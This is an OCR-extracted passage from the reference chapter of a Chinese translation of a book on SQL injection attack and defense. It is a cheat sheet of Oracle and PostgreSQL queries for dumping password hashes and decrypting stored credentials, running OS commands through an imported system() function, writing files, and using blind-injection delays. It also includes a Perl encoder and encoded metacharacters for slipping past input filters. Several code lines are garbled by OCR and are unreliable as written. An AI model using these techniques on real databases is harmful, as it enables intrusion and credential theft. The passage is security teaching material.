create directory MYDIR as 'C:\′;
exec SYS.DBMS_ADVISOR.CREATE_FILE ('This is the
content′1Ichr (13)II*Next 1ine′, *MYDIR′, *myfile.txt′)
412
---
## Page 427
第11章参考资料
5）破解数据库口令
根据数据库版本的不同，可以通过执行下列查询中的一条来从数据库中提取口令哈希：
SELECT name, password FROM sys.user$ where type#>0 and
--DES Hashes (7-10g)
length (password) =16;
SELECT name, spare4 FROM sys,userS where type#>0 and length (spare4) =62;
有超过100张（取决于安装的组件）的Oracle表中包含口令信息。这些口令有时候可以以明
文方式得到。下面的例子将尝试提取明文口令：
select view_username, sysman.decrypt (view_password) from sysman.mgmt_
view_user_credentials/
select credential_set_column,
sysman,decrypt (credential_value) from
sysman.mgmt_credentia1s2
select sysman.decrypt (aru_username), sysman.decrypt (aru_password) from
sysman.mgmt_aru_credentials;
接下来可以使用很多可免费获取的工具（比如Woraauthbf、John the Ripper、Gsauditor、
Checkpwd和Cain&Abel）来破解Oracle口令哈希。请参阅本章末尾的11.7节“资源”以获取
这些工具的下载链接。
11.3.6PostgreSQL备忘单
PostgreSQL是一种可以在大多数操作系统平台上使用的开源数据库。要想下载完整的用户
手册，请访间 www.postgresql.org/docs/manuals/。
1.枚举数据库配置信息和模式
表11-19列出了用于提取关键配置信息的SQL语句。表11-20列出了用于枚举模式信息的
SQL语句。
表11-19提取PostgreSQL数据库的配置信息
数
据
查
版本
SELECT version()
SELECT getpgusername () :
当前用户
SELECT user;
SELECT current_user;
SELECT session_user;
列出用户
SELECT usename FROM pg_user
当前用户权限
SELECT usename, usecreatedb, usesuper,
usecatupd FROM pg_user
数据库服务器主机名
SELECT inet_server_addr () )
413
---
## Page 428
SQL注入攻击与防御（第2版）
表11-20提取PostgreSQL数据库的模式信息
数
查
询
当前数据库
SELECT current_database () ;
列出数据库
SELECT datname FROM pg_database
SELECT c.relname FROM pg_catalog-pg_class c LEFT J0IN
Pg_catalog·pg_namespace n ON n.oid = c.relnamespace
列出表
WHERE c,relkind IN (*r'′, '*)
AND pg_catalog-pg_table_is_visible (c,oid)
AND n.nspname NOT IN (*pg_catalog′, *pg_toast*);
SELECT relname, A.attname FROM pg_class C,
Pg_namespace N, Pg_attribute A, P9_type T WHERE
列出列
(,Tqnd, = aweudsu*N) NV (,,=puTx[ax*)
AND (A,attrelid=C,oid) AND (N,oid=C,re1namespace)
AND (A.atttypid-T,oid) AND (A,attnum>0)
AND (NOT A.attisdropped) ;
2.SQL盲注函数：PostgreSQL
表11-21列出了执行SQL盲注攻击时一些非常有用的函数。
表11-21SQL盲注函数
数
据
查
询
字符串长度
LENGTH ()
从给定字符串中提取子串
SUBSTRING (string, offset, length)
字符串（ABC）不带单引号的表示方式
SELECT CHR (65) 11CHR (66) 11CHR (67) :
触发时间延迟
SELECT p9_sleep (10);
触发10秒的延迟
3.攻击数据库服务器：PostgreSQL
PostgreSQL并未提供执行操作系统命令的内置存储过程，不过可以从外部的.dll或共享对
象（sharedobject)（.so）文件中导入诸如 systemO这样的函数。借助PostgreSQL并使用COPY语句
同样可以读取本地文件。
1）执行系统命令
对于8.2版本之前的PostgreSQL数据库服务器，可以使用下列SQL语句从标准UNIXlibc
库导入system函数：
'system′ LANGUAGE 'C’ STRICT;
接下来可以通过执行下列SQL查询调用system函数：
SELECT system (*command′) ;
414
---
## Page 429
第11章参考资料
当前的PostgreSQL版本要求使用定义好的PostgreSQLPG_MODULE_MAGIC宏来编译外
部库。要想通过该方法实现代码执行，需要上传自已的共享.so或.dIl文件，它们启用了恰当的
PG_MODULE_MAGIC宏。请参考下列资源以获取更多信息：www.postgresqL.org/docs/8.2/static
xfunc-c.html#XFUNC-C-DYNLOAD。
2）访问本地文件
可以使用下列SQL语句并借助超级用户账户来读取本地文件，这些文件是使用操作系统
级的PostgreSQL用户账户打开的：
CREATE TABLE filedata (t text):
可以使用下列SQL语句来写本地文件，这些文件也是使用操作系统级的PostgreSQL用户
账户创建的：
CREATE TABLE thefile (evildata text);
INSERT INTO thefile (evildata) VALUES (*some evil data*)/
COPY thefi1e (evi1data) To /tmp/evi1script.sh′;
3）破解数据库口令
可以使用MD5算法来哈希PostgreSQL口令。在哈希发生前要向口令中添加用户名，并且
要在相应的哈希中包含前置的md5字符。下列SQL查询会列出PostgreSQL数据库中的用户名
和口令：
select usenamel1* :*1lpasswd from pg_shadow;
sqhacker用户的示例项如下所示：
sq1hacker :md544715a9661408abe727f9963bf6dad93
很多口令破解工具都支持MD5哈希，包括MDCrack、John the Ripper和 Cain&Abel等。
11.4避开输入验证过滤器
通常可以通过编码输入来避开那些依赖于拒绝已知不良字符和字符串常量的输入验证过
滤器。本节为那些为避开以这种方式运作的输入验证过滤器而经常使用的编码技术提供参考。
11.4.1引1号过滤器
单引号字符（与SQL注入攻击向文。正因为如此，通常会对单引号进行过滤或双重编码
（doubleup）以作为一种防御机制。其思想在于防止攻击者突破使用引号界定的数据。遗憾的是，
当易受攻击的用户输入是数字值时，这种策略会失败，因为数字值不会使用引号字符来进行界
定。过滤或审查引号字符时，需要编码字符串的值以防止它们被过滤器破坏。表11-22列出了
在各种流行的数据库平台上表示SEZECTABC这一查询时可以选用的方法。
415
---
## Page 430
SQL注入攻击与防御（第2版）
表11-22不使用引号字符表示字符串
平
查
询
Microsof SQL Server
SELECT char (0x41)+ char(0x42)+ char(0x43);
MySQL Server
SELECT char (65, 66, 67) ;
SELECT 0x414243;
SELECT chr (65) 11chr (66) 11 chr (67) from dual;
Select concat (chx (65) , concat (chr (66) , chz (67))) from dua1)
Oracle
Select upper ((select substr (banner, 3, 1) 11 substr (banner,
12, 1) 11substr (banner, 4, 1) from v$version where
rownum=1)) from dual;
PostgreSQL
SELECT chr (65) 11chr (66) 11chax (67) ;
Microsof SQLServer还支持在变量中构造查询，然后调用EXEC来执行它。在下面的例子
中，我们创建了一个名为@q的变量，并借助一个十六进制编码的字符串将SELECT'ABC查询
赋值给该变量：
DECLARE @q varchar (8000)
SELECT @q=0x53454c454354202741424327
EXEC (8q)
采用该技术可以在不向应用程序提交任何引号字符的前提下，执行任意查询，可以使用下
列Perl脚本并借助该技术来自动编码SQL语句：
1/usr/bin/per1
r_:epooue oq Azanb r0s xoqug. 4ufad
$teststr=;chomp Steststr;
$hardcoded_sq1 -
'declare @q varchar (8000) ′,
'select @q=0x****,
exec (@q) ′;
Sprepared - encode_sql ($teststr):
6/pexedexds/-\1\/s~= tbspapoopzeus
r_u\u\:0s pepooug[]u\_ quTxd
print $hardcoded_sq] ."\n";
sub encode_sql[
Bsubvar=8_:
my $sqlstr =$subvar[0]:
BASCII = unpack(*c**, $sqlstr) ;
foreach $line (@ASCII)(
$encoded = sprintf (*$1x′, $1ine) ;
$encoded_command ,- Sencoded;
return $encoded_command;
11.4.2HTTP编码
有时可以使用外来编码标准或者借助双重编码来编码输入，以避开那些拒绝已知不良字符
（通常称为黑名单）的输入验证过滤器。表11-23列出了常见的SQL元字符的多种编码格式。
416
---
## Page 431
第11章参考资料
表11-23编码后的SQL元字符
字
符
编码后的变量
%27
%2527
L200n%
%u02b9
%ca%b9
%22
%2522
%u0022
%uffF02
%ef%bc%82
%3b
%253b
%u0003b
%uff1b
%ef%bc%9b
%28
%2528
%u0028
%uff08
%ef%bc%88
%29